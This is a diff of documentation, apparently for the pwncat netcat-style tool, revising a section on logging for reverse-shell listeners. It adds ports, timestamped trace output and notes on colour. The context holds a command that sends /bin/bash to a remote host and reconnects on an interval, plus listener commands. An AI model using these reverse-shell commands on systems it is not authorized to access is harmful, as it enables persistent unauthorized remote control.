@@ -632,22 +632,27 @@ pwncat --exec /bin/bash --nodns --udp --ping-intvl 2 10.0.0.1 4444
 > **Note:** Ensure you have a reverse shell that keeps coming back to you. This way you can always change your logging settings without loosing the shell.
 
 If you feel like, you can start a listener in full TRACE logging mode to figure out what's going on or simply to troubleshoot.
+Log message are colored depending on their severity. Colors are automatically turned off, if stderr is not a pty, e.g.: if piping those to a file.
+You can also manually disable colored logging for terminal outputs via the `--color` switch.
 ```bash
-# The server
-# -v   # The logging level
-# -l   # Listen for incoming connections
-pwncat -vvvv -l
+pwncat -vvvv -l 4444
 ```
 You will see (among all the gibberish) a TRACE message:
+```bash
+2020-05-11 08:40:57,927 DEBUG NetcatServer.receive(): 'Client connected: 127.0.0.1:46744'
+2020-05-11 08:40:57,927 TRACE [STDIN] 1854:producer(): Command output: b'\x1b[32m[0]\x1b[0m\r\r\n'
+2020-05-11 08:40:57,927 TRACE [STDIN] 2047:run_action(): [STDIN] Producer received: '\x1b[32m[0]\x1b[0m\r\r\n'
+2020-05-11 08:40:57,927 DEBUG [STDIN] 815:send(): Trying to send 15 bytes to 127.0.0.1:46744
+2020-05-11 08:40:57,927 TRACE [STDIN] 817:send(): Trying to send: b'\x1b[32m[0]\x1b[0m\r\r\n'
+2020-05-11 08:40:57,927 DEBUG [STDIN] 834:send(): Sent 15 bytes to 127.0.0.1:46744 (0 bytes remaining)
+2020-05-11 08:40:57,928 TRACE [STDIN] 1852:producer(): Reading command output
 ```
-[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:43213'
-```
+
 As soon as you saw this on the listener, you can issue commands to the client.
 All the debug messages are also not necessary, so you can safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate
 your server and start it again in silent mode:
 ```bash
-# The server
-pwncat -l
+pwncat -l 4444
 ```
 Now wait a maximum a few seconds, depending at what interval the client comes back to you and voila, your session is now again without logs.
 
@@ -655,22 +660,22 @@ Having no info messages at all, is also sometimes not desirable. You might want 
 on behind the scences or? Safely <kbd>Ctrl</kbd>+<kbd>c</kbd> terminate your server and redirect
 the notifications to a logfile:
 ```bash
-# The server
-# 2> comm.txt   # This redirects the messages to a logfile instead
-pwncat -l -vvv 2> comm.txt
+pwncat -l -vvv 4444 2> comm.txt
 ```
 Now all you'll see in your terminal session are the actual command inputs and outputs.
 If you want to see what's going on behind the scene, open a second terminal window and tail
 the `comm.txt` file:
-```
+```bash
 # View communication info
 tail -fn50 comm.txt
 
-[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
-[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
-[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
-[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
-[DEBUG] NetcatServer.receive(): 'Client connected: 10.0.0.105:52167'
+2020-05-11 08:40:57,927 DEBUG NetcatServer.receive(): 'Client connected: 127.0.0.1:46744'
+2020-05-11 08:40:57,927 TRACE [STDIN] 1854:producer(): Command output: b'\x1b[32m[0]\x1b[0m\r\r\n'
+2020-05-11 08:40:57,927 TRACE [STDIN] 2047:run_action(): [STDIN] Producer received: '\x1b[32m[0]\x1b[0m\r\r\n'
+2020-05-11 08:40:57,927 DEBUG [STDIN] 815:send(): Trying to send 15 bytes to 127.0.0.1:46744
+2020-05-11 08:40:57,927 TRACE [STDIN] 817:send(): Trying to send: b'\x1b[32m[0]\x1b[0m\r\r\n'
+2020-05-11 08:40:57,927 DEBUG [STDIN] 834:send(): Sent 15 bytes to 127.0.0.1:46744 (0 bytes remaining)
+2020-05-11 08:40:57,928 TRACE [STDIN] 1852:producer(): Reading command output
 ```
 <!--
 </details>
